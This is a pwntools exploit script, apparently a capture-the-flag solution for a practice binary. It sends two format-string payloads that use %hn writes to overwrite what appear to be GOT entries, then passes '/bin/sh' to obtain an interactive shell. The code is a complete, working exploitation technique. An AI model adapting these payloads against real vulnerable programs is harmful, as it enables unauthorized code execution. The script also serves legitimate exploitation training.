from pwn import *

import time

target = process("./chall-test_fmtString-6-x64")
gdb.attach(target)

address = 0x4033e8
address0 = p64(address + 0x0)
address1 = p64(address + 0x2)
address2 = p64(address + 0x4)
address3 = p64(address + 0x6)
# The value we are trying to write
value = 0x40119d

# The print value size, to control the value being written
print0 = "%4509c"
print1 = "%61091c"
print2 = "%65472c"
print3 = "%65536c"

# Specify the offset to the address, and write to it
write0 = "%14$hn"
write1 = "%15$hn"
write2 = "%16$hn"
write3 = "%17$hn"

# Form the payload
payload = ""
payload += print0
payload += write0
payload += print1
payload += write1
payload += print2
payload += write2
payload += print3
payload += write3
payload += "0"*(0x40 - len(payload))
payload += address0
payload += address1
payload += address2
payload += address3

# Send the fmt string payload
target.sendline(payload)
address = 0x4033a8
address0 = p64(address + 0x0)
address1 = p64(address + 0x2)
address2 = p64(address + 0x4)
address3 = p64(address + 0x6)
# The value we are trying to write
value = 0x401070

# The print value size, to control the value being written
print0 = "%4208c"
print1 = "%61392c"
print2 = "%65472c"
print3 = "%65536c"

# Specify the offset to the address, and write to it
write0 = "%14$hn"
write1 = "%15$hn"
write2 = "%16$hn"
write3 = "%17$hn"

# Form the payload
payload = ""
payload += print0
payload += write0
payload += print1
payload += write1
payload += print2
payload += write2
payload += print3
payload += write3
payload += "0"*(0x40 - len(payload))
payload += address0
payload += address1
payload += address2
payload += address3

# Send the fmt string payload
target.sendline(payload)

target.sendline("/bin/sh\x00")

target.interactive()
